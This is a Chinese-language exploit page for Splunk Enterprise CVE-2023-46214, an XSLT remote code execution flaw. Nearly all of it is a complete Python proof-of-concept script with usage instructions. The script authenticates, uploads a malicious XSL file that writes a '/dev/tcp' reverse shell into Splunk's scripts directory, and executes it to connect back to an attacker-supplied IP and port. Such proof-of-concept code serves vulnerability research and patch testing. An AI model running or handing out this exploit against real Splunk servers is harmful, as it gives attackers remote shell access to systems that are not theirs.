
## Splunk Enterprise 远程代码执行漏洞 (CVE-2023-46214)
Splunk 是一款机器数据的引擎，可用于收集、索引和利用所有应用程序、服务器和设备生成的快速移动型计算机数据 。

在 Splunk Enterprise 9.0.7 和 9.1.2 以下版本中，Splunk Enterprise 无法安全地对用户提供的可扩展样式表语言转换 (XSLT) 进行过滤，攻击者可以上传恶意 XSLT，从而在 Splunk Enterprise 实例上远程执行代码。

## exp
- https://github.com/nathan31337/Splunk-RCE-poc
  

```python
#!/usr/bin/env python3

import argparse
import requests
import json

# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
proxies = {}

def generate_malicious_xsl(ip, port):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
        <xsl:text>sh -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
"""

def login(session, url, username, password):
    login_url = f"{url}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    response = session.get(login_url, proxies=proxies)
    cval_value = session.cookies.get("cval", None)

    if not cval_value:
        return False

    auth_payload = {
        "cval": cval_value,
        "username": username,
        "password": password,
        "set_has_logged_in": "false",
    }

    auth_url = f"{url}/en-US/account/login"
    response = session.post(auth_url, data=auth_payload, proxies=proxies)
    return response.status_code == 200

def get_cookie(session, url):
    response = session.get(url, proxies=proxies)
    return response.status_code == 200

def upload_file(session, url, file_content, csrf_token):
    files = {'spl-file': ('shell.xsl', file_content, 'application/xslt+xml')}
    upload_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
        "X-Requested-With": "XMLHttpRequest",
        "X-Splunk-Form-Key": csrf_token,
    }

    upload_url = f"{url}/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl"
    response = session.post(upload_url, files=files, headers=upload_headers, verify=False, proxies=proxies)

    try:
        text_value = json.loads(response.text)['messages'][0]['text']
        if "concatenate" in text_value:
            return False, None
        return True, text_value
    except (json.JSONDecodeError, KeyError, IndexError):
        return False, None

def get_job_search_id(session, url, username, csrf_token):
    jsid_data = {'search': f'|search test|head 1'}
    jsid_url = f"{url}/en-US/splunkd/__raw/servicesNS/{username}/search/search/jobs?output_mode=json"
    upload_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "X-Requested-With": "XMLHttpRequest",
        "X-Splunk-Form-Key": csrf_token,
    }
    response = session.post(jsid_url, data=jsid_data, headers=upload_headers, verify=False, proxies=proxies)
    try:
        jsid = json.loads(response.text)['sid']
        return True, jsid
    except (json.JSONDecodeError, KeyError, IndexError):
        return False, None


def trigger_xslt_transform(session, url, jsid, text_value):
    xslt_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "X-Splunk-Module": "Splunk.Module.DispatchingModule",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
    }
    exploit_endpoint = f"{url}/en-US/api/search/jobs/{jsid}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{text_value}/shell.xsl"
    response = session.get(exploit_endpoint, verify=False, proxies=proxies)
    response = session.get(exploit_endpoint, verify=False, headers=xslt_headers, proxies=proxies)
    return response.status_code == 200

def trigger_reverse_shell(session, url, username, jsid, csrf_token):
    runshellscript_data = {'search': f'|runshellscript "shell.sh" "" "" "" "" "" "" "" "{jsid}"'}
    runshellscript_url = f"{url}/en-US/splunkd/__raw/servicesNS/{username}/search/search/jobs"
    upload_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "X-Requested-With": "XMLHttpRequest",
        "X-Splunk-Form-Key": csrf_token,
    }
    response = session.post(runshellscript_url, data=runshellscript_data, headers=upload_headers, verify=False, proxies=proxies)
    return response.status_code == 201

def main():
    parser = argparse.ArgumentParser(description='Splunk CVE-2023-46214 RCE PoC')
    parser.add_argument('--url', required=True, help='Splunk instance URL')
    parser.add_argument('--username', required=True, help='Splunk username')
    parser.add_argument('--password', required=True, help='Splunk password')
    parser.add_argument('--ip', required=True, help='Reverse Shell IP')
    parser.add_argument('--port', required=True, help='Reverse Shell Port')

    args = parser.parse_args()

    session = requests.Session()

    print("[!] CVE: CVE-2023-46214")
    print("[!] Github: https://github.com/nathan31337/Splunk-RCE-poc")


    if not login(session, args.url, args.username, args.password):
        print("[-] Authentication failed")
        exit()

    print("[+] Authentication successful")

    print("[*] Grabbing CSRF token", end="\r")
    if not get_cookie(session, f"{args.url}/en-US"):
        print("[-] Failed to obtain CSRF token")
        exit()

    print("[+] CSRF token obtained")

    csrf_token = session.cookies.get("splunkweb_csrf_token_8000", None)

    malicious_xsl = generate_malicious_xsl(args.ip, args.port)
    uploaded, text_value = upload_file(session, args.url, malicious_xsl, csrf_token)

    if not uploaded:
        print("[-] File upload failed")
        exit()

    print("[+] Malicious XSL file uploaded successfully")

    jsid_created, jsid = get_job_search_id(session, args.url, args.username, csrf_token)

    if not jsid_created:
        print("[-] Creating job failed")
        exit()

    print("[+] Job search ID obtained")

    print("[*] Grabbing new CSRF token", end="\r")
    if not get_cookie(session, f"{args.url}/en-US"):
        print("[-] Failed to obtain CSRF token")
        exit()

    print("[+] New CSRF token obtained")

    if not trigger_xslt_transform(session, args.url, jsid, text_value):
        print("[-] XSLT Transform failed")
        exit()

    print("[+] Successfully wrote reverse shell to disk")
    if not trigger_reverse_shell(session, args.url, args.username, jsid, csrf_token):
        print("[-] Failed to execute reverse shell")
        exit()

    print("[+] Reverse shell executed! Got shell?")

if __name__ == "__main__":
    main()
```

## 使用方法
```
python3 CVE-2023-46214.py --url <Splunk_URL> --username <Username> --password <Password> --ip <Reverse_Shell_IP> --port <Reverse_Shell_Port>
```

## 漏洞分析
- https://blog.hrncirik.net/cve-2023-46214-analysis
